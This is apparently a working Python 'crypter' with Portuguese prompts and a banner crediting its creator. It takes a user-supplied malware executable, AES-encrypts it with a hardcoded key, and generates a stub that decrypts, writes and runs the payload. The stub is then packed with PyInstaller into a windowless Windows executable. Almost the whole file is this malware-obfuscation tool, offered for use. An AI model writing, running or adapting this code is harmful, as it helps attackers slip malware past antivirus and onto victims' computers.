import subprocess
import pyaes
import os

# Altere a chave (precisa ter 16 caracteres de tamanho)
KEY = b'chavefoda1abcdef'
print("""
  sSSs   .S_sSSs     .S S.    .S_sSSs    sdSS_SSSSSSbs    sSSs   .S_sSSs    
 d%%SP  .SS~YS%%b   .SS SS.  .SS~YS%%b   YSSS~S%SSSSSP   d%%SP  .SS~YS%%b   
d%S'    S%S   `S%b  S%S S%S  S%S   `S%b       S%S       d%S'    S%S   `S%b  
S%S     S%S    S%S  S%S S%S  S%S    S%S       S%S       S%S     S%S    S%S  
S&S     S%S    d*S  S%S S%S  S%S    d*S       S&S       S&S     S%S    d*S  
S&S     S&S   .S*S   SS SS   S&S   .S*S       S&S       S&S_Ss  S&S   .S*S  
S&S     S&S_sdSSS     S S    S&S_sdSSS        S&S       S&S~SP  S&S_sdSSS   
S&S     S&S~YSY%b     SSS    S&S~YSSY         S&S       S&S     S&S~YSY%b   
S*b     S*S   `S%b    S*S    S*S              S*S       S*b     S*S   `S%b  
S*S.    S*S    S%S    S*S    S*S              S*S       S*S.    S*S    S%S  
 SSSbs  S*S    S&S    S*S    S*S              S*S        SSSbs  S*S    S&S  
  YSSP  S*S    SSS    S*S    S*S              S*S         YSSP  S*S    SSS  
        SP            SP     SP               SP                SP          
        Y             Y      Y                Y                 Y          
       
Este crypter só funciona em computadores rodando Windows!
Github do criador: https://github.com/Gusbtc/
      """)

print()
executavel = input('Coloque o caminho para o seu malware: ')
final = input('Como vai ficar o nome do arquivo final: ')

if ".exe" not in final:
    final = final + ".exe"


try:
    with open(executavel, "rb") as virus:
        mal = virus.read()
    criptografado = pyaes.AESModeOfOperationCTR(KEY).encrypt(mal)
except:
    print('Arquivo não encontrado')
    quit()

stub = f"""import pyaes
import subprocess
import os
KEY = {KEY}
cripto = {criptografado}
descripto = pyaes.AESModeOfOperationCTR(KEY).decrypt(cripto)
final = '{final}'

with open(final, 'wb') as executavel:
    executavel.write(descripto)

proc = subprocess.Popen(final)

"""

with open('stub.py', "w") as resultado:
    resultado.write(stub)

os.system(f'pyinstaller -F -w --clean stub.py')
